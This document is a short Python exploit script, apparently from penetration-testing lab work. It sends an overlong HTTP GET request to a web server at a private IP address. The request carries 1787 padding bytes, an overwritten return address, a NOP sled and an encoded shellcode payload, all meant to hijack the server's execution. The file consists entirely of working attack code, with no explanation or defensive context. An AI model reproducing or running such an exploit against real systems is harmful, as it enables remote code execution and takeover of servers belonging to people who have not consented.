#!/usr/share/python
# encoding: utf-8

import socket

buf =  b""
buf += b"\xda\xd7\xd9\x74\x24\xf4\xbe\xb7\x0b\x55\xfd\x5a\x29"
buf += b"\xc9\xb1\x52\x31\x72\x17\x83\xc2\x04\x03\xc5\x18\xb7"
buf += b"\x08\xd5\xf7\xb5\xf3\x25\x08\xda\x7a\xc0\x39\xda\x19"
buf += b"\x81\x6a\xea\x6a\xc7\x86\x81\x3f\xf3\x1d\xe7\x97\xf4"
buf += b"\x96\x42\xce\x3b\x26\xfe\x32\x5a\xa4\xfd\x66\xbc\x95"
buf += b"\xcd\x7a\xbd\xd2\x30\x76\xef\x8b\x3f\x25\x1f\xbf\x0a"
buf += b"\xf6\x94\xf3\x9b\x7e\x49\x43\x9d\xaf\xdc\xdf\xc4\x6f"
buf += b"\xdf\x0c\x7d\x26\xc7\x51\xb8\xf0\x7c\xa1\x36\x03\x54"
buf += b"\xfb\xb7\xa8\x99\x33\x4a\xb0\xde\xf4\xb5\xc7\x16\x07"
buf += b"\x4b\xd0\xed\x75\x97\x55\xf5\xde\x5c\xcd\xd1\xdf\xb1"
buf += b"\x88\x92\xec\x7e\xde\xfc\xf0\x81\x33\x77\x0c\x09\xb2"
buf += b"\x57\x84\x49\x91\x73\xcc\x0a\xb8\x22\xa8\xfd\xc5\x34"
buf += b"\x13\xa1\x63\x3f\xbe\xb6\x19\x62\xd7\x7b\x10\x9c\x27"
buf += b"\x14\x23\xef\x15\xbb\x9f\x67\x16\x34\x06\x70\x59\x6f"
buf += b"\xfe\xee\xa4\x90\xff\x27\x63\xc4\xaf\x5f\x42\x65\x24"
buf += b"\x9f\x6b\xb0\xeb\xcf\xc3\x6b\x4c\xbf\xa3\xdb\x24\xd5"
buf += b"\x2b\x03\x54\xd6\xe1\x2c\xff\x2d\x62\x93\xa8\xf3\xf7"
buf += b"\x7b\xab\x0b\xf9\xc0\x22\xed\x93\x26\x63\xa6\x0b\xde"
buf += b"\x2e\x3c\xad\x1f\xe5\x39\xed\x94\x0a\xbe\xa0\x5c\x66"
buf += b"\xac\x55\xad\x3d\x8e\xf0\xb2\xeb\xa6\x9f\x21\x70\x36"
buf += b"\xe9\x59\x2f\x61\xbe\xac\x26\xe7\x52\x96\x90\x15\xaf"
buf += b"\x4e\xda\x9d\x74\xb3\xe5\x1c\xf8\x8f\xc1\x0e\xc4\x10"
buf += b"\x4e\x7a\x98\x46\x18\xd4\x5e\x31\xea\x8e\x08\xee\xa4"
buf += b"\x46\xcc\xdc\x76\x10\xd1\x08\x01\xfc\x60\xe5\x54\x03"
buf += b"\x4c\x61\x51\x7c\xb0\x11\x9e\x57\x70\x21\xd5\xf5\xd1"
buf += b"\xaa\xb0\x6c\x60\xb7\x42\x5b\xa7\xce\xc0\x69\x58\x35"
buf += b"\xd8\x18\x5d\x71\x5e\xf1\x2f\xea\x0b\xf5\x9c\x0b\x1e"


bufferfin = "GET" + "\x41" * 1787 + "\xD7\x30\x9D\x7C" + "\x90" * 20 + buf +" HTTP/1.1\r\n\r\n"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.50.135",80))
sock.send(bufferfin)
sock.recv(1024)
sock.close()
exit()
